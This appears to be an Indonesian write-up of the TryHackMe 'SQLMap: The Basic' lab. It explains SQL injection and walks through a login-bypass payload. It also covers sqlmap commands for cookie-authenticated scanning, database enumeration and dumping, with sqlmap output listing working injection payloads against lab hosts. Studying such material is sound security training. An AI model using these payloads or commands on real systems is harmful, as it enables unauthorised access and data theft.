# TryHackMe: SQLMap: The Basic

- **Room Link:** [SQLMap: The Basic](https://tryhackme.com/room/sqlmapthebasics)
- **Kategori:** Offensive Security Tooling
- **Difficulty:** easy

## Task 1: Introduction

memahami fundamental kerentanan injeksi SQL (SQLi) dan bagaimana kita bisa memanfaatkannya (dan mengotomatiskannya) menggunakan _tool_ andalan para _attacker_, yakni **SQLMap**. Di akhir materi, kita juga akan melakukan simulasi _hands-on_ serangan langsung ke target

**(Learning Objectives):**

- Membedah kerentanan SQL Injection.
- Melakukan (_hunting_) SQL Injection secara otomatis menggunakan tool **SQLMap**.

Injeksi SQL (_SQL injection_) adalah kerentanan yang sangat umum dan menjadi topik hangat namun klasik di ranah Cyber Security. Untuk memahami kerentanan ini, kita harus memahami terlebih dahulu apa itu _database_ (basis data) dan bagaimana _website_ berinteraksi dengannya.

### Apa itu Database?

Database adalah sebuah kumpulan data berskala besar yang mempermudah proses penyimpanan, pengubahan, dan pengambilan informasi dalam format yang terstruktur.

Sebuah halaman web seringkali membutuhkan data atau input dari pengguna, contohnya:

- **Halaman Login:** Website meminta _credentials_ (username & password). Input ini lalu dicocokkan dengan data pengguna yang sudah tersimpan di database. Jika cocok, pengguna berhasil masuk.
- **Fitur Pencarian:** Saat mencari buku di situs toko buku, _website_ akan mengambil (meng-_query_) data ke database buku yang dijual lalu menampilkannya kembail di web.

### Bagaimana Website Berinteraksi dengan Database?

Website berinteraksi dan meminta informasi menggunakan sistem manajemen berbasis pangkalan data, atau yang lebih dikenal sebagai **DBMS** (_Database Management Systems_).

Contoh DBMS yang populer adalah MySQL, PostgreSQL, SQLite, dan Microsoft SQL Server. Semua sistem ini memahami bahasa standar untuk kueri data yang disebut **SQL** (_Structured Query Language_). Oleh karena itu, aplikasi dan website menggunakan perintah kueri SQL ketika berkomunikasi dengan database.

## Task 2: SQL Injection Vulnerability

Di task sebelumnya, kita sudah memahami bagaimana aplikasi _web_ berinteraksi dengan _database_. Sebuah _web_ hanyalah kurir yang membawa pesan (Input Pengguna) untuk diberikan kepada sang penjaga gudang data (_Database_) dalam bentuk **SQL Queries**.

Di dalam skenario eksploitation, seorang _attacker_ tidak sekadar memasukkan data normal. Kita **MEMANIPULASI** pertanyaan (SQL Query) itu sendiri langsung dari formulir atau parameter yang ada di aplikasi _web_. Jika pertahanannya lemah, Input jahat kita akan dieksekusi oleh _database_ sebagai perintah yang valid. Inilah inti dari **SQL Injection (SQLi)**: menyusupkan (_injecting_) bahasa pemrograman SQL ke dalam input untuk mengambil alih kendali _database_ di background.

### inti Konsep

Bayangkan aplikasi web adalah seorang **Pelayan Restoran**, dan Database adalah sang **Koki** di dapur.

- **Skenario Normal:** Kamu pesan, _"Nasi Goreng satu."_ Pelayan meneruskan pesanan ini ke dapur: `BUATKAN Nasi Goreng SATU`. Koki memasak dan memberikan nasi goreng.
- **Skenario SQL Injection (Serangan):** Kamu memesan dengan kalimat manipulatif, _"Nasi Goreng satu, **DAN BERIKAN SAYA KUNCI BRANKAS KASIR**."_ Karena pelayan (Web) terlalu polos dan tidak memfilter pesananmu, dia meneruskan kalimat itu mentah-mentah ke dapur: `BUATKAN Nasi Goreng SATU DAN BERIKAN DIA KUNCI BRANKAS KASIR`. Sang Koki (Database) yang diprogram untuk hanya menuruti perintah, akhirnya memberikan nasi goreng **sekaligus kunci brankas restoran tersebut**.

Inilah kenapa SQLi terjadi. Web (pelayan) gagal mensanitasi ekspektasi _input_ dari aktor jahat.

### Skema Serangan (Bypass Login)

Mari kita bedah skenario dunia nyata. Bayangkan sebuah _form login_ sederhana yang meminta `Username` dan `Password` kepada target.

Sebagian besar mekanisme _login_ kuno bekerja dengan mengambil _input_ pengguna dan menyisipkannya langsung ke dalam sebuah query SQL.

**Skenario Normal (Penggunaan Valid):**
Jika pengguna reguler memasukkan data otentikasi:

- **Username:** `John`
- **Password:** `Un@detectable444`

Sistem (Aplikasi Web) akan menelan _input_ tersebut dan merakitnya menjadi sebuah kueri SQL yang akan dilempar ke sang Koki (_Database_):

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

- **Keterangan (_Autopsy_):**
  Query di atas menginstruksikan Database: _"Tampilkan semua data dari tabel `users`, di mana kolom `username` sama dengan 'John' **DAN** kolom `password` sama dengan 'Un@detectable444'."_
  Jika tidak ada kombinasi `username` dan `password` yang pas 100%, akses akan ditolak. Ini adalah mekanisme autentikasi logis yang wajar. Tapi, apa jadinya jika kita memanipulasi _logic_ tersebut?

**Skenario Serangan (Eksploitasi Login):**
Karena target (_Web_) dibangun tanpa validasi _input_ (sanitasi), kita bisa menyusupkan query SQL jahat ke dalamnya. Kali ini, _attacker_ sama sekali tidak tahu _password_ milik user `John`. Jadi, sang _attacker_ memasukkan data mematikan ini:

- **Username:** `John`
- **Password:** `abc' OR 1=1;-- -`

Sistem (Aplikasi Web) kembali membuat blind query:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

### Payload Autopsy & Weaponization (Membedah Serangan)

Perhatikan kehancuran logika pada query di atas. query tersebut kini berubah wujud. Mari kita bedah _payload_ `' OR 1=1;-- -` baris per baris:

1. **`'` (Single Quote Pertama):** Ini adalah senjata utama kita. Kita menutup _string password_ lebih awal secara paksa. Seharusnya `password = '...'`, tapi kita menjadikannya `password = 'abc'`. Kolom _password_ selesai dievaluasi sampai sini.
2. **`OR` (Operator Logika):** Query aslinya mengharuskan (`username` = BENAR) **DAN** (`password` = BENAR). Dengan menyisipkan kata `OR` (ATAU), kita menimpa kewajiban itu.
3. **`1=1` (Pernyataan Mutlak):** Apakah 1 sama dengan 1? Selalu **BENAR (True)**. Jadi, mesin SQL membaca: _"Cocokkan password dengan 'abc' ATAU pastikan 1=1"_. Karena 1=1 selalu rill/nyata, _database_ menganggap kondisi ini **SELALU BERHASIL**. autentikasi jebol.
4. **`;` (Semicolon):** Digunakan untuk menandai bahwa satu pernyataan SQL telah selesai/berakhir.
5. **`-- -` (Comment SQL):** Ini adalah teknik penyamaran yang jenius. Karakter ini memberitahu _database_ untuk **MENGABAIKAN/MENGOMENTARI** semua sisa teks kueri asli bawaan web yang tertinggal di belakangnya (seperti penutup tanda kutip `';` bawaan _web_). Tanpa tanda komentar ini, kueri akan _error_ (/Syntax Error/).

Hasil akhirnya? Pemilik aslinya menangis, dan kita (Red Team) masuk (Login) sebagai `John` tanpa perlu bersusah payah menebak _password_-nya.

> [!WARNING]
> _Always attack responsibly kids!_

### Question

1. Apa peran utama "Web" dan "Database" dalam simulasi SQL Injection? Mengapa eksploitasi bisa terjadi?
2. Sebagai seorang Red Teamer, hal paling penting apa yang harus kamu miliki sebelum melakukan sebuah inject _payload_ SQLi ke sebuah target?
3. Saat membedah payload `' OR 1=1;-- -`, apa fungsi spesifik dari penanda komentar `-- -` di akhir kalimat? Apa yang akan terjadi jika kita lupa menambahkannya?

## Task 3 Automated SQL Injection

Eksploitasi SQL Injection secara manual (terutama jenis _blind_) memang sangat penting untuk memahami fondasinya. Tapi di lapangan, ngekstrak _database_ segede gaban secara manual bakal ngabisin banyak tenaga dan waktu banget, Bro. Di situlah kita main pakai **SQLMap**.

### Apa itu SQLMap?

Ibaratnya, SQLMap itu _sniper rifle_ otomatis buat urusan SQL Injection. Ini adalah _tool command-line open-source_ sakti yang dirancang khusus untuk mengotomatisasi proses pendeteksian dan eksploitasi kerentanan SQLi. Tool ini bahkan udah bawaan (_built-in_) di beberapa OS Linux _pentesting_.

### Menggunakan SQLMap

Karena ini murni _command-line tool_, kamu harus buka terminal OS Linux kamu. Kamu bisa pakai _flag_ `--help` buat ngeliat deretan fungsi dan parameter buas yang bisa kamu setel. Tapi, buat pemula atau kalau kamu pengen panduan anti-ribet, ada _flag_ andalan:

**The Wizard Mode (`--wizard`)**
Mode ini super asyik karena _tool_ bakal memandu kamu secara interaktif, nanya langkah demi langkah buat nyelesaiin konfigurasi serangannya, cocok banget buat _beginners_.

```bash
sqlmap --wizard
```

_Output_ di terminal kamu (seperti gambar) kurang lebih bakal nampilin _banner_ SQLmap, ngejalanin _wizard interface_, dan pertama kali bakal minta URL target lo:

```text
user@ubuntu:~$ sqlmap --wizard

    ___
   __H__
 ___ __[']_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[text removed]

[*] starting at 08:42:50

[08:42:50] [INFO] starting wizard interface
Please enter full target URL (-u):
```

---

### Titik Injeksi (Injection Points)

Secara umum, _hunting_ kerentanan ini dimulai dengan mencari celah URL yang nampung _input_ data (parameter):

1. **HTTP GET-Based Testing:**
   URL yang pakai parameter GET biasanya gampang terlihat di _address bar_. Contoh: `http://sqlmaptesting.thm/search?cat=1`. Di sini SQLMap bakal ngehajar parameter `cat` dengan berbagai payload SQLi buat nguji seberapa kuat sanitasi _backend_-nya. Cukup lempar URL ini pakai _flag_ `-u`.

   ```bash
   sqlmap -u "http://sqlmaptesting.thm/search?cat=1"
   ```

2. **Authenticated Scanning (Cookie-Based Testing):**
   Di dunia nyata, jalur fatal yang rentan SQLi seringkali _di belakang pintu masuk_ (contoh: dashboard admin, profile user), yang artinya kamu harus **_login_** dulu. Kalau kamu langsung pakai sqlmap biasa, _request_ aneh bakal nyangkut di halaman login (unauthenticated).

   **Solusi:** Kamu harus tangkep (capture) dan injek _Session Cookie_ (seperti `PHPSESSID`, `JSESSIONID`, dll) yang valid ke dalam SQLMap pakai _flag_ `--cookie`. Jadi, SQLMap bakal "menyamar" jadi diri user yang udah _login_.

   ```bash
   sqlmap -u "http://target.com/admin/search?id=1" --cookie="SESSIONID=abcdef123456"
   ```

---

### Membedah Output SQLMap (Terminal Autopsy)

Ketika SQLMap ditembakkan ke _Injection Point_ dan celahnya terkonfirmasi (Vulnerable), terminal bakal ngeluarin banyak info krusial.

```zsh
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
    ___
   __H__
 ___ __[']_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[text removed]
[08:43:49] [INFO] testing connection to the target URL
[08:43:49] [INFO] heuristics detected web page charset 'ascii'
[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[08:43:49] [INFO] testing if the target URL content is stable
[08:43:50] [INFO] target URL content is stable
[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic
[text removed]
[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[text removed]
[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cat=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f...
---
[08:45:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[text removed]
```

Perhatikan baris-baris krusial dari output di atas:

1. **WAF/IPS/IDS Check (`checking if the target is protected...`)**
   SQLMap secara otomatis bakal nyari tau dulu apakah ada Firewall/IPS yang jagain website itu sebelum ia masuk dan _bruteforce_ _payloads_.
2. **Injection Point Confirmation (`GET parameter 'cat' is vulnerable...`)**
   Kalau dapet pesan ini, Celah (Injection Point) berhasil dikonfirmasi bisa diinjeksi.
3. **Payload Autopsy (Tipe Serangan yang Berhasil)**
   SQLMap membongkar _exact payload_ apa yang sukses merobohkan _backend_. Misalnya di atas: _boolean-based_, _error-based_, dan _UNION_. Di dunia _pentest_, _payload_ ini akan kamu salin untuk dimasukkan ke laporan buktinya (Proof of Concept).
4. **Fingerprinting**
   Di bagian bawah output, identitas target berhasil dibongkar: `DBMS: MySQL >= 5.1`, OS _Server_: `Linux Ubuntu`, dan Web Server-nya `Nginx`. _(Mendapatkan OS ini sangat penting buat Red Teamer jika skenarionya eskalasi untuk mengambil alih mesin tersebut atau RCE)._

---

### Data Extraction (Ekskavasi Data)

Setelah celah URL _vulnerable_ (_Injection Point_) dikonfirmasi dan _fingerprinting_ berhasil, SQLMap akan digunakan secara bertahap untuk panen data dari _database_ tersebut. Gunakan hirarki _flag_ ini:

**1. Mencari Nama Database (`--dbs`)**
Langkah awal adalah mencari tumpukan lumbung hartanya, apa nama _databases_ yang bisa kita akses. Eksekusi Flag `--dbs`:

```bash
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
    ___
   __H__
 ___ __[']_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[text removed]
[08:49:01] [INFO] fetching database names
available databases [2]:
[*] users
[*] members

[text removed]
```

_Dari gambar terminal di atas, SQLMap sukses mengambil nama database yaitu `users` dan `members`._

**2. Melihat Isi Tabel (`-D <nama_database> --tables`)**
Setelah tahu sasarannya (misal database `members`), kamu bongkar buat melihat ada tabel apa aja di dalamnya.

**3. The Holy Grail Dump (`-D <nama_database> -T <nama_tabel> --dump`)**
Digunakan untuk memuntahkan (dumping) seluruh isi _records_ atau data sensitif di dalam _table_ tersebut.

---

**Question**

1. Dalam skenario nyata, kenapa kita memakai SQLMap daripada mengeksploitasi kerentanan SQLi secara manual murni?
2. Urutkan _flag_ SQLMap yang benar (dari struktur tertinggi ke terendah) jika kita ingin panen isi data tabel secara spesifik!
3. Target kamu ternyata memiliki celah pencarian (search) yang rentan di halaman _Settings_. Masalahnya, halaman itu hanya bisa diakses kalau kamu udah _login_. _Flag_ apa yang harus kamu bawa di SQLMap agar serangan ini berhasil nembus layar autentikasi?
4. Saat SQLMap menemukan celah, ada bagian informasi _Fingerprinting_ (seperti OS, _Tech Stack_, DBMS version) yang ikut bocor. Buat seorang _Attacker/Red Team_, kenapa mendapatkan info OS _server target_ itu sangat berharga?
